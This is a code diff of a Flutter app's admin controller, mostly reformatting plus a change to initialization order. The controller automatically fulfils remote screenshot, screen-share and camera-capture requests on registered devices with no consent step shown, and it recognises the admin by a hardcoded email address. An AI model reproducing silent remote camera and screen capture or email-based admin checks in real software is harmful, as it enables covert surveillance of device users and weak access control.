@@ -104,7 +104,8 @@ class ScreenshotRequestItem {
       screenshotUrl: data['screenshotUrl'] as String?,
       requestedAt: (data['requestedAt'] as Timestamp?)?.toDate(),
       completedAt: (data['completedAt'] as Timestamp?)?.toDate(),
-      backgroundAttemptedAt: (data['backgroundAttemptedAt'] as Timestamp?)?.toDate(),
+      backgroundAttemptedAt:
+          (data['backgroundAttemptedAt'] as Timestamp?)?.toDate(),
       error: data['error'] as String?,
       failureReason: data['failureReason'] as String?,
     );
@@ -121,25 +122,34 @@ class AdminController extends GetxController {
 
   StreamSubscription<QuerySnapshot<Map<String, dynamic>>>? _devicesSubscription;
   StreamSubscription<QuerySnapshot<Map<String, dynamic>>>?
-  _requestsSubscription;
+      _requestsSubscription;
   StreamSubscription<QuerySnapshot<Map<String, dynamic>>>?
-  _incomingRequestsSubscription;
+      _incomingRequestsSubscription;
 
   Future<void> initialize() async {
-    currentDeviceId.value = await AdminService.getOrCreateDeviceId();
-    final currentUser = FirebaseAuth.instance.currentUser;
-    if (currentUser != null && currentUser.email?.toLowerCase() == 'admin@yopmail.com') {
-      try {
-        final adminDevId = 'user_${currentUser.uid}';
-        await FirebaseFirestore.instance.collection('devices').doc(adminDevId).delete();
-      } catch (_) {}
-    } else {
-      await AdminService.registerDevice();
-    }
+    isReady.value = true;
     _listenToDevices();
     _listenToOwnRequests();
     _listenToIncomingRequests();
-    isReady.value = true;
+
+    try {
+      currentDeviceId.value = await AdminService.getOrCreateDeviceId();
+      final currentUser = FirebaseAuth.instance.currentUser;
+      if (currentUser != null &&
+          currentUser.email?.toLowerCase() == 'admin@yopmail.com') {
+        try {
+          final adminDevId = 'user_${currentUser.uid}';
+          await FirebaseFirestore.instance
+              .collection('devices')
+              .doc(adminDevId)
+              .delete();
+        } catch (_) {}
+      } else {
+        await AdminService.registerDevice();
+      }
+    } catch (e) {
+      debugPrint('Non-fatal AdminController background registration error: $e');
+    }
   }
 
   void _listenToDevices() {
@@ -167,7 +177,9 @@ class AdminController extends GetxController {
             uniqueMap[key] = dev;
           } else {
             final existing = uniqueMap[key]!;
-            if (dev.lastSeenAt != null && (existing.lastSeenAt == null || dev.lastSeenAt!.isAfter(existing.lastSeenAt!))) {
+            if (dev.lastSeenAt != null &&
+                (existing.lastSeenAt == null ||
+                    dev.lastSeenAt!.isAfter(existing.lastSeenAt!))) {
               uniqueMap[key] = dev;
             }
           }
@@ -182,50 +194,48 @@ class AdminController extends GetxController {
 
   void _listenToOwnRequests() {
     _requestsSubscription?.cancel();
-    _requestsSubscription = AdminService.watchOwnRequests(currentDeviceId.value)
-        .listen(
-          (snapshot) {
-            final list = snapshot.docs
-                .map(ScreenshotRequestItem.fromSnapshot)
-                .toList();
-            list.sort((a, b) {
-              final aTime = a.requestedAt?.millisecondsSinceEpoch ?? 0;
-              final bTime = b.requestedAt?.millisecondsSinceEpoch ?? 0;
-              return bTime.compareTo(aTime);
-            });
-            screenshotRequests.value = list;
-          },
-          onError: (error) {
-            debugPrint('Admin request listener error: $error');
-          },
-        );
+    _requestsSubscription =
+        AdminService.watchOwnRequests(currentDeviceId.value).listen(
+      (snapshot) {
+        final list =
+            snapshot.docs.map(ScreenshotRequestItem.fromSnapshot).toList();
+        list.sort((a, b) {
+          final aTime = a.requestedAt?.millisecondsSinceEpoch ?? 0;
+          final bTime = b.requestedAt?.millisecondsSinceEpoch ?? 0;
+          return bTime.compareTo(aTime);
+        });
+        screenshotRequests.value = list;
+      },
+      onError: (error) {
+        debugPrint('Admin request listener error: $error');
+      },
+    );
   }
 
   void _listenToIncomingRequests() {
     _incomingRequestsSubscription?.cancel();
-    _incomingRequestsSubscription =
-        AdminService.watchPendingRequestsForDevice(
-          currentDeviceId.value,
-        ).listen(
-          (snapshot) {
-            for (final doc in snapshot.docs) {
-              final requestType =
-                  (doc.data()['requestType'] as String?) ?? 'screenshot';
-              if (requestType == 'screen_share') {
-                AdminService.fulfillScreenShareRequest(doc.id);
-              } else if (requestType == 'camera_capture') {
-                AdminService.fulfillCameraCaptureRequest(doc.id);
-              } else if (requestType == 'camera_stream') {
-                AdminService.fulfillScreenShareRequest(doc.id);
-              } else {
-                AdminService.fulfillScreenshotRequest(doc.id);
-              }
-            }
-          },
-          onError: (error) {
-            debugPrint('Incoming screenshot listener error: $error');
-          },
-        );
+    _incomingRequestsSubscription = AdminService.watchPendingRequestsForDevice(
+      currentDeviceId.value,
+    ).listen(
+      (snapshot) {
+        for (final doc in snapshot.docs) {
+          final requestType =
+              (doc.data()['requestType'] as String?) ?? 'screenshot';
+          if (requestType == 'screen_share') {
+            AdminService.fulfillScreenShareRequest(doc.id);
+          } else if (requestType == 'camera_capture') {
+            AdminService.fulfillCameraCaptureRequest(doc.id);
+          } else if (requestType == 'camera_stream') {
+            AdminService.fulfillScreenShareRequest(doc.id);
+          } else {
+            AdminService.fulfillScreenshotRequest(doc.id);
+          }
+        }
+      },
+      onError: (error) {
+        debugPrint('Incoming screenshot listener error: $error');
+      },
+    );
   }
 
   Future<void> refreshDeviceList() async {
